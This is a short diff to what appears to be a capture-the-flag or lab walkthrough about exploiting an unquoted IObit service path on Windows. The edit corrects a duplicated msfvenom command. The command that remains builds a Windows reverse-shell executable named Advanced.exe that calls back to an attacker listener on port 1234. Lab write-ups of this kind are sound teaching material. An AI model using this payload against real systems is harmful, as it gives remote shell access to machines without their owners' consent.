@@ -231,7 +231,7 @@ Once the execution reaches `“…\IObit\Advanced”` it will append `.exe` to `
 Now Let’s create our evil binary, we’ll use msfvenom like so:
 
 ```shell     
-msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exemsfvenom -p windows/shell_reverse_tcp LHOST=10.17.8.26 LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
+msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe
 ```
 {: .nolineno }
 
